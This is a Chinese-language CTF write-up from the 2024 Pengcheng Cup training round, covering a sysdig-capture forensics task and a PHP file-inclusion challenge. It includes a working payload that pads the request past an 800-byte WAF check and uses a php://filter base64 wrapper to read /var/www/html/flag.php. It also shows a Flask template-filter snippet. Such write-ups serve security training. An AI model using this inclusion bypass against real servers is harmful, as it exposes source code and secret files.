---
title: "鹏城杯2024-训练"
date: "2024-12-19"
description: "scap 是sysdig 监控的工具，可以使用wireshark 打开scap 文件发现了很多事件，应该就是一些事件的流量监控。"
---

#### [](#misc "misc")misc

##### [](#what-is-log "what_is_log")what\_is\_log

scap 是sysdig 监控的工具，可以使用wireshark 打开scap 文件发现了很多事件，应该就是一些事件的流量监控。

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20241108165010.png)  
导出write 流量，并且过滤39长度的包，找到85长度的包有一个success 后面的hash就是flag

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20241108165110.png)

#### [](#web "web")web

##### [](#简单文件包含 "简单文件包含")简单文件包含

直接就是 文件包含但是过滤了什么于是直接读取index.php ，找到过滤点

```php
<?php$path = $_POST["flag"];if (strlen(file_get_contents('php://input')) < 800 && preg_match('/flag/', $path)) {    echo 'nssctf waf!';} else {    @include($path);}?><code><span style="color: #000000"><span style="color: #0000BB">&lt;?php&nbsp;<br />highlight_file</span><span style="color: #007700">(</span><span style="color: #0000BB">__FILE__</span><span style="color: #007700">);<br />include(</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">[</span><span style="color: #DD0000">"flag"</span><span style="color: #007700">]);<br /></span><span style="color: #FF8000">//flag&nbsp;in&nbsp;/var/www/html/flag.php;</span></span></code><br />
```

只是禁了flag同时有一个检测800，只要大于八百那么flag就不会检测。

```shell
c=0123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779780781782783784785786787788789790791792793794795796797798799&flag=php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php
```

#### [](#misc-1 "misc")misc

txy{uwwospnropsprtssuurtvrttsvtqurpvsrxutzww}

#### [](#web-1 "web")web

```python
@app.route('/')
def index(solved=0):
    global current_expr
    # 前端计算
    # .....
    # .....
    # 通过计算
    username = 'ctfer!'
    if request.args.get('username'):
        username = request.args.get('username')
        if whitelist_filter(username,whitelist_patterns):
            if blacklist_filter(username):
                return render_template_string("filtered")
            else:
                print("你过关！")
        else:
            return render_template_string("filtered")
    return render_template('index.html', username=username, hint="f4dd790b-bc4e-48de-b717-903d433c597f")
```
